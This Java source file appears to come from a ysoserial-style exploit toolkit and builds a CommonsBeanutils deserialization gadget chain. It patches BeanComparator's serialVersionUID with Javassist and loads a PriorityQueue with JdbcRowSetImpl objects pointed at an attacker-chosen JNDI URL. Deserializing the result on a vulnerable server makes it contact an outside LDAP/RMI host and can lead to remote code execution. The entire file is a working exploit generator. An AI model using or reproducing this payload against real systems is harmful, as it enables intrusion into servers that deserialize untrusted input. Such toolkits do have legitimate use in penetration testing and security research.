package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.custom.CommandConstant;
import cn.butler.yso.JavassistClassLoader;
import cn.butler.yso.payloads.custom.CustomCommand;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.annotation.PayloadTest;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.BEIYING })
public class CommonsBeanutils3_183 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String jndiURL = null;
        if(command.toLowerCase().startsWith(CommandConstant.COMMAND_JNDI)){
            jndiURL = command.substring(CommandConstant.COMMAND_JNDI.length());
        }else{
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        ctBeanComparator.defrost();
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));

        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        Reflections.setFieldValue(comparator, "property", null);
        Reflections.setFieldValue(comparator,"comparator",String.CASE_INSENSITIVE_ORDER);

        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiURL);
        rs.setMatchColumn("foo");
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        Reflections.setFieldValue(comparator, "property", "databaseMetaData");
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = rs;
        queueArray[1] = rs;
        ctBeanComparator.defrost();
        return  queue;
    }

    public static void main ( String[] args ) throws Exception {
        args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        PayloadRunner.run(CommonsBeanutils3_183.class, args);
    }
}
